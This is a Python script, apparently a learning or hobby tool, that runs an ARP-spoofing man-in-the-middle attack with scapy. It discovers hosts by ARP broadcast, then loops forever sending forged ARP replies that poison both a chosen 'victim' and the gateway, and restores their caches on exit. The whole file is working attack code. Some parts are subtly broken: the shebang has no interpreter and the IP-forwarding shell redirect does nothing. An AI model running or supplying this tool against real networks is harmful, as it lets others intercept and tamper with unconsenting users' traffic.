#!/usr/bin/env
import scapy.all as scapy
import argparse
import time
import subprocess
import sys



def get_mac(dest_ip):
	"""
	function sends ARP request to network gateway to obtain device MAC addresses
	:param dest_ip: the IP of the host, or IP range for which MAC addresses are to be obtained
	:return: a list containing a dictionary entry with key-value pairs for IP and MAC addresses for each host
	"""
	
	arp_request = scapy.ARP(pdst=dest_ip)
	broadcast_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast_packet = broadcast_request / arp_request
	answered_packets = scapy.srp(arp_request_broadcast_packet, timeout=1, verbose=True)[0]
	reply_dict_list = []

	for element in answered_packets:
		packet_dict_entry = {"ip": element[1].psrc, "mac": element[1].hwsrc}
		reply_dict_list.append(packet_dict_entry)
	if not reply_dict_list:
		print("[-] Host " + str(dest_ip) + " is not up, or that IP does not exist on current subnet")
		sys.exit(0)
	else:
		return reply_dict_list




def spoof_arp(target_ip, target_mac, source_ip):
	"""
	function performs the ARP response to target in order to establish your host as the man in the middle
	:param target_ip: the IP address of the victim you are posing at the router to
	:param target_mac: the MAC address of the victim
	:param source_ip: the IP address you are impersonating
	"""
	arp_response_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip)
	scapy.send(arp_response_packet, verbose=False)




def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac):
	"""
	function performs the ARP response to target in order to restore its original ARP cache
	:param target_ip: the IP address of the victim you are posing at the router to
	:param target_mac: the MAC address of the victim
	:param source_ip: the IP address you are impersonating
	"""
	arp_response_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
	scapy.send(arp_response_packet, verbose=False)




def get_arguments():
	"""
	function gets arguments from the terminal
	:return: returns a variable containing the arguments from object ArgumentParser()'s method parse_args()
	"""
	parser = argparse.ArgumentParser()
	parser.add_argument("-t", "--target", dest="target_ip", help="the IP address of the target machine")
	parser.add_argument("-s", "--source", dest="source_ip", help="the IP address of the network gateway "
															"you are impersonating")
	arguments = parser.parse_args()
	if not arguments.target_ip:
		parser.error("[-] please specify a target IP address")
	elif not arguments.source_ip:
		parser.error("[-] please specify a source IP address")
	else:
		return arguments




def execute():
	"""
	runs the script and displays host and target data in the terminal
	"""
	arguments = get_arguments()

	target_mac_list = get_mac(arguments.target_ip)
	source_mac = get_mac(arguments.source_ip)[0]["mac"]
	
	subprocess.run(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
	packet_count = 0
	print("\n")
	print("               " + "\t\t" + "IP address  " + "\t" + "MAC address")
	print("\n")
	print("Current source:" + "\t\t" + str(arguments.source_ip) + "\t" + str(source_mac))
	print("\n")

	for dict_entry in target_mac_list:
		if dict_entry["ip"] != arguments.source_ip:
			print("Current target:" + "\t\t" + str(dict_entry["ip"]) + "\t" + str(dict_entry["mac"]))
	print("\n")
	while True:
		try:
			for dict_entry in target_mac_list:
				if dict_entry["ip"] != arguments.source_ip:
					spoof_arp(dict_entry["ip"], dict_entry["mac"], arguments.source_ip)
					spoof_arp(arguments.source_ip, source_mac, dict_entry["ip"])
					time.sleep(2)
					print("\r[+] Packets sent: " + str(packet_count), end="")
					packet_count += 2
		except KeyboardInterrupt:
			for dict_entry in target_mac_list:
				if dict_entry["ip"] != arguments.source_ip:
					restore_arp(dict_entry["ip"], dict_entry["mac"], arguments.source_ip, source_mac)
					restore_arp(arguments.source_ip, source_mac, dict_entry["ip"], dict_entry["mac"])
			print("[+] CTRL + C detected, exiting and restoring ARP configuration")
			subprocess.run(["echo", "0", ">", "/proc/sys/net/ipv4/ip_forward"])
			subprocess.run(["cat", "/proc/sys/net/ipv4/ip_forward"])
			sys.exit(0)


execute()
